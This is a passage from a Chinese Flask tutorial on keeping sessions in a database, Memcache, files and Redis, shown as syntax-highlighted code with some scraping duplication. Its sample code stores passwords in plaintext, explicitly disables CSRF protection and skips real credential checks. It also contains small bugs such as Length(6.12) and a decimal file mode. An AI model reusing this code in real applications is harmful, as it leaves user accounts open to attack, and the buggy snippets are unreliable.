spellcheck="true"># 设置session</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user            <span class="token keyword">if</span> remember<span class="token punctuation">:</span>                session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">True</span>                app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span>                    <span class="token string">'PERMANENT_SESSION_LIFETIME'</span><span class="token punctuation">:</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span>                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>username <span class="token operator">==</span> user<span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span> User<span class="token punctuation">.</span>remember<span class="token punctuation">:</span> remember<span class="token punctuation">}</span><span class="token punctuation">)</span>                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>User<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>User<span class="token punctuation">.</span>username <span class="token operator">==</span> user<span class="token punctuation">)</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span> User<span class="token punctuation">.</span>remember<span class="token punctuation">:</span> remember<span class="token punctuation">}</span><span class="token punctuation">)</span>                db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">return</span> <span class="token string">'success'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/register/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># post请求,并验证通过</span>        user <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        passwd <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data        user1 <span class="token operator">=</span> User<span class="token punctuation">(</span>username<span class="token operator">=</span>user<span class="token punctuation">,</span> password<span class="token operator">=</span>passwd<span class="token punctuation">,</span> remember<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user1<span class="token punctuation">)</span>        db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-创建脚本控制文件"><a href="#6-创建脚本控制文件" class="headerlink" title="6.创建脚本控制文件"></a>6.创建脚本控制文件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># appmanager.py</span><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> flask_migrate <span class="token keyword">import</span> MigrateCommand<span class="token punctuation">,</span>Migrate<span class="token keyword">from</span> dbModel <span class="token keyword">import</span> User<span class="token comment" spellcheck="true"># 绑定Flask app</span>manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 导入 flask-migrate</span><span class="token comment" spellcheck="true"># migrate绑定app, db</span><span class="token comment" spellcheck="true"># MigrateCommand 可以使用Alembic所有的命令</span><span class="token comment" spellcheck="true"># 导入所需要的 ORM</span>Migrate<span class="token punctuation">(</span>app<span class="token punctuation">,</span> db<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用命令行创建数据库</span>manager<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span><span class="token string">'db'</span><span class="token punctuation">,</span> MigrateCommand<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 起一个别名</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="7-根据脚本初始化"><a href="#7-根据脚本初始化" class="headerlink" title="7.根据脚本初始化"></a>7.根据脚本初始化</h4><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ python appmanager.py db init$ python appmanager.py db migrate$ python appmanager.py db  upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>需要注意的是数据库中的<code>session</code>表是<code>flask-session</code>创建的,并不需要我们去手动映射这张表,但是一定要去创建表.</p></blockquote><h4 id="8-运行"><a href="#8-运行" class="headerlink" title="8.运行"></a>8.运行</h4><blockquote><pre class="line-numbers language-bash">$ python app.py</code></pre><p>运行程序后观察<code>session</code>的创建.</p></blockquote><h3 id="4-使用Memcache存储"><a href="#4-使用Memcache存储" class="headerlink" title="4.使用Memcache存储"></a>4.使用Memcache存储</h3><blockquote><p>前期也讲解过<code>Memcache</code>的基本概念,已经如何使用<code>Python</code>操作<code>Memcache</code>.</p><p>如果你有所遗忘,请再次阅读一遍<code>https://wenyan.online/2020/09/27/flaskmemcache/</code></p><p>接下来,讨论如何将<code>session</code>信息写入到<code>memcache</code>中</p></blockquote><h4 id="1-login-html"><a href="#1-login-html" class="headerlink" title="1.login.html"></a>1.<code>login.html</code></h4><blockquote><p>像<code>SQlalchemy</code>一样,有一些文件是不要变动的.这里我们只需要一个能<code>post</code>的文件</p><pre><code class="html"><code class="language-bash">$ python app.py</code></pre><p>运行程序后观察<code>session</code>的创建.</p></blockquote><h3 id="4-使用Memcache存储"><a href="#4-使用Memcache存储" class="headerlink" title="4.使用Memcache存储"></a>4.使用Memcache存储</h3><blockquote><p>前期也讲解过<code>Memcache</code>的基本概念,已经如何使用<code>Python</code>操作<code>Memcache</code>.</p><p>如果你有所遗忘,请再次阅读一遍<code>https://wenyan.online/2020/09/27/flaskmemcache/</code></p><p>接下来,讨论如何将<code>session</code>信息写入到<code>memcache</code>中</p></blockquote><h4 id="1-login-html"><a href="#1-login-html" class="headerlink" title="1.login.html"></a>1.<code>login.html</code></h4><blockquote><p>像<code>SQlalchemy</code>一样,有一些文件是不要变动的.这里我们只需要一个能<code>post</code>的文件</p><pre><code class="html"><!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>登录</title></head><body>    <form action="" method="post">        <p><label for="">username:</label><input type="text" name=username></p>        <p><label for="">password:</label><input type="password" name="password"></p>        <p><input type="submit" value="Login"></p>        <p><label for="">30 days remember me</label> <input type="checkbox" name="remember"></p>    </form></body></html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-memecacheModel-py"><a href="#2-memecacheModel-py" class="headerlink" title="2.memecacheModel.py"></a>2.<code>memecacheModel.py</code></h4><blockquote><p>为了构造的合理,这里把<code>Memcache</code>相关的都存放在同一个文件中.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pymemcache<span class="token punctuation">.</span>client <span class="token keyword">import</span> Clientclient <span class="token operator">=</span> Client<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> <span class="token number">11211</span><span class="token punctuation">)</span><span class="token punctuation">,</span> allow_unicode_keys<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意: 你需要先启动自己的<code>memcache</code>,然后才能正常的连接.</p></blockquote><h4 id="3-config-py"><a href="#3-config-py" class="headerlink" title="3.config.py"></a>3.<code>config.py</code></h4><blockquote><p>配置文件是重中之重,要在这个文件中指定保存的类型.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 导入memcache</span><span class="token keyword">from</span> memecacheModel <span class="token keyword">import</span> client<span class="token keyword">import</span> osDEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># flask-session</span>SESSION_TYPE <span class="token operator">=</span> <span class="token string">'memcached'</span> <span class="token comment" spellcheck="true"># 指定类型</span>SESSION_MEMCACHED <span class="token operator">=</span> client <span class="token comment" spellcheck="true"># memcached实例</span>SESSION_USE_SIGNER <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 设定加密</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设定加密秘钥</span>SESSION_KEY_PREFIX <span class="token operator">=</span> <span class="token string">'session'</span> <span class="token comment" spellcheck="true"># 设定值的前缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:上面的<code>client</code>实例,是需要导入到文件中的.</p></blockquote><h4 id="4-formModel-py"><a href="#4-formModel-py" class="headerlink" title="4.formModel.py"></a>4.<code>formModel.py</code></h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_wtf <span class="token keyword">import</span> FlaskForm<span class="token keyword">from</span> wtforms <span class="token keyword">import</span> StringField<span class="token punctuation">,</span> BooleanField<span class="token punctuation">,</span>IntegerField<span class="token punctuation">,</span>PasswordField<span class="token keyword">from</span> wtforms<span class="token punctuation">.</span>validators <span class="token keyword">import</span> Length<span class="token punctuation">,</span>EqualTo<span class="token keyword">class</span> <span class="token class-name">LoginForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6.12</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    remember <span class="token operator">=</span> BooleanField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:<code>remember</code>也就是<code>html redio</code>点选框,这里使用的是<code>boolean</code>值判断,如果点选就是<code>True</code>,没有点选就是<code>False</code></p></blockquote><h4 id="5-app-py"><a href="#5-app-py" class="headerlink" title="5.app.py"></a>5.<code>app.py</code></h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span> session<span class="token punctuation">,</span>escape<span class="token keyword">from</span> formModel <span class="token keyword">import</span> LoginForm<span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Session <span class="token keyword">as</span> Fsession<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta<span class="token keyword">from</span> memecacheModel <span class="token keyword">import</span> clientapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>Fsession<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># escape 用来替换html中的16进制特殊符号</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as {}.&lt;a href="/logout/">Logout&lt;/a>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>escape<span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'You are not log in &lt;a href="/login/">Login&lt;a>'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#  假设数据库验证通过, 添加 session</span>        user <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data        remember <span class="token operator">=</span> form<span class="token punctuation">.</span>remember<span class="token punctuation">.</span>data        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> user        <span class="token keyword">print</span><span class="token punctuation">(</span>remember<span class="token punctuation">)</span>        <span class="token keyword">if</span> remember<span class="token punctuation">:</span>            session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">True</span>            app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'SESSION_COOKIE_LIFETIME'</span><span class="token punctuation">:</span> timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token string">'success'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/logout/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意:<code>if remember:</code>判断,点选后,设置永久保存,已经过期时间.</p></blockquote><h4 id="6-运行文件"><a href="#6-运行文件" class="headerlink" title="6.运行文件"></a>6.运行文件</h4><blockquote><p>首先运行程序文件</p><pre class="line-numbers language-bash">$ python app.py</code></pre><p>为了观察方便,这里连接到了<code>memcache</code>,并清空了所有的<code>key/value</code></p><pre><code class="bash"><code class="language-bash">$ python app.py</code></pre><p>为了观察方便,这里连接到了<code>memcache</code>,并清空了所有的<code>key/value</code></p><pre><code class="bash">$ telenet 192.168.0.101 11211 flush_all  # 清空所有keyOKstats items  # 查看所有的key,为空END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>尝试在浏览器中访问<code>127.0.0.1:5000</code>并登录,如果你点选了<code>radio</code>,将会看到过期时间.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601217202962-10302.png" alt="10302"></p><p>然后,去查看<code>memcache</code></p><pre class="line-numbers language-bash"><code class="language-bash">stats itemsSTAT items:3:number 1STAT items:3:number_hot 0STAT items:3:number_warm 0STAT items:3:number_cold 1STAT items:3:age_hot 0STAT items:3:age_warm 0STAT items:3:age 116STAT items:3:mem_requested 152STAT items:3:evicted 0STAT items:3:evicted_nonzero 0STAT items:3:evicted_time 0STAT items:3:outofmemory 0STAT items:3:tailrepairs 0STAT items:3:reclaimed 9STAT items:3:expired_unfetched 8STAT items:3:evicted_unfetched 0STAT items:3:evicted_active 0STAT items:3:crawler_reclaimed 0STAT items:3:crawler_items_checked 21STAT items:3:lrutail_reflocked 0STAT items:3:moves_to_cold 24STAT items:3:moves_to_warm 0STAT items:3:moves_within_lru 0STAT items:3:direct_reclaims 0STAT items:3:hits_to_hot 1STAT items:3:hits_to_warm 0STAT items:3:hits_to_cold 15STAT items:3:hits_to_temp 0END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到已经被创建了一个<code>id =3</code>的缓存.查看它的具体内容</p><pre class="line-numbers language-bash"><code class="language-bash">stats cachedump 3 0    <span class="token comment" spellcheck="true"># 3表示id 0 表示所有的内容</span>ITEM session19a0d005-8469-475f-a465-bffa9716a8f5 <span class="token punctuation">[</span>50 b<span class="token punctuation">;</span> 1603895548 s<span class="token punctuation">]</span>END<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>以<code>session</code>打头的就是我们的<code>key</code>,因为<code>config.py</code>中指定了<code>SESSION_KEY_PREFIX = &#39;session&#39;</code>,使用<code>get</code> 命令可以查看到<code>value</code></p><pre class="line-numbers language-bash">get session19a0d005-8469-475f-a465-bffa9716a8f5</code></pre></blockquote><h3 id="5-使用filesystem保存"><a href="#5-使用filesystem保存" class="headerlink" title="5.使用filesystem保存"></a>5.使用<code>filesystem</code>保存</h3><blockquote><p>除去保存在数据库中,<code>Session</code>还支持保存在文件中,这里我们保留整个项目的架构,并使用文件来保存<code>session</code><br>参考代码<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T21</code></p></blockquote><h4 id="1-app-py"><a href="#1-app-py" class="headerlink" title="1.app.py"></a>1.<code>app.py</code></h4><blockquote><p>保持基本内容不变.</p><pre><code class="python"><code class="language-bash">get session19a0d005-8469-475f-a465-bffa9716a8f5</code></pre></blockquote><h3 id="5-使用filesystem保存"><a href="#5-使用filesystem保存" class="headerlink" title="5.使用filesystem保存"></a>5.使用<code>filesystem</code>保存</h3><blockquote><p>除去保存在数据库中,<code>Session</code>还支持保存在文件中,这里我们保留整个项目的架构,并使用文件来保存<code>session</code><br>参考代码<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T21</code></p></blockquote><h4 id="1-app-py"><a href="#1-app-py" class="headerlink" title="1.app.py"></a>1.<code>app.py</code></h4><blockquote><p>保持基本内容不变.</p><pre><code class="python">from flask import Flaskimport configfrom flask_session import Session as Fsessionfrom flask import session,redirect,url_for,render_template,escapefrom formModel import LoginFormfrom datetime import timedeltaapp = Flask(__name__)app.config.from_object(config)Fsession(app)@app.route('/')def index():   if 'username' in session:       # escape 用来替换html中的16进制特殊符号       return 'Logged in as {}.<a href="/logout/">Logout</a>'.format(escape(session.get('username')))   return 'You are not log in <a href="/login/">Login<a>'@app.route('/login/', methods=['GET', 'POST'])def login():   form = LoginForm()   if form.validate_on_submit():       #  假设数据库验证通过, 添加 session       user = form.username.data       remember = form.remember.data       session['username'] = user       print(remember)       if remember:           session.permanent = True           app.config.update({'SESSION_COOKIE_LIFETIME': timedelta(days=30) })       else:           session.permanent = False       return 'success'   return render_template('login.html')@app.route('/logout/')def logout():   session.clear()   return redirect(url_for('index'))if __name__ == '__main__':   app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="2-config-py"><a href="#2-config-py" class="headerlink" title="2.config.py"></a>2.<code>config.py</code></h4><blockquote><p>更新<code>config.py</code>中的内容,指定保存到文件系统,并指定保存的位置.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> osDEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># 指定Session保存类型</span>SESSION_TYPE <span class="token operator">=</span> <span class="token string">'filesystem'</span>SESSION_FILE_DIR <span class="token operator">=</span> <span class="token string">'./flask_session'</span>SESSION_FILE_THRESHOLD <span class="token operator">=</span> <span class="token number">10</span> <span class="token comment" spellcheck="true"># 默认是500,大于设定值,会自动删除</span>SESSION_FILE_MODE <span class="token operator">=</span> <span class="token number">600</span> <span class="token comment" spellcheck="true"># 默认值,文件模式,读写执行</span>SESSION_PERMANENT <span class="token operator">=</span> <span class="token boolean">False</span>SESSION_USE_SIGNER <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 加密</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 设定加密秘</span>SESSION_KEY_PREFIX<span class="token operator">=</span> <span class="token string">'session'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>默认情况下,保存在当前文件夹下的<code>flask_session</code>中,如果没有这个文件夹,可以创建</p><pre class="line-numbers language-bash">mkdir flask_session</code></pre></blockquote><h4 id="3-运行验证"><a href="#3-运行验证" class="headerlink" title="3.运行验证"></a>3.运行验证</h4><blockquote><p>运行<code>app.py</code></p><pre><code class="bash">$ python app.py</code></pre><p>尝试登录并访问<code>login.html</code>,当登录成功后,可以查看目录中是否有内容</p><pre><code class="bash"><code class="language-bash">mkdir flask_session</code></pre></blockquote><h4 id="3-运行验证"><a href="#3-运行验证" class="headerlink" title="3.运行验证"></a>3.运行验证</h4><blockquote><p>运行<code>app.py</code></p><pre><code class="bash">$ python app.py</code></pre><p>尝试登录并访问<code>login.html</code>,当登录成功后,可以查看目录中是否有内容</p><pre><code class="bash">❯ cd flask_session❯ ls2029240f6d1128be89ddc32729463129  c6c2fab146ee32903dae14542c25f2f472d690441984324e808ad61897999f8e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果有内容,证明<code>Session</code>已经被保存在文件夹中.</p></blockquote><h3 id="6-保存在redis中"><a href="#6-保存在redis中" class="headerlink" title="6.保存在redis中"></a>6.保存在<code>redis</code>中</h3><blockquote><p>可以选择保存在<code>redis</code>中,它的可用性更高,占用内存更小</p><p>代码参考<code>https://github.com/ningwenyan/demo_code/tree/master/flask_demo_code/T22</code></p></blockquote><h4 id="1-app-py-1"><a href="#1-app-py-1" class="headerlink" title="1.app.py"></a>1.<code>app.py</code></h4><blockquote><p>保持基本内容不变</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask_session <span class="token keyword">import</span> Session <span class="token keyword">as</span> Fsession<span class="token keyword">from</span> flask <span class="token keyword">import</span> session<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>escape<span class="token keyword">from</span> formModel <span class="token keyword">import</span> LoginForm<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>Fsession<span class="token punctuation">(</span>app<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># escape 用来替换html中的16进制特殊符号</span>        <span class="token keyword">return</span> <span class="token string">'Logged in as {}.&lt;a href="/logout/">Logout&lt;/a>'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>escape<span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'You are not log in &lt;a href="/login/">Login&lt;a>'</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span 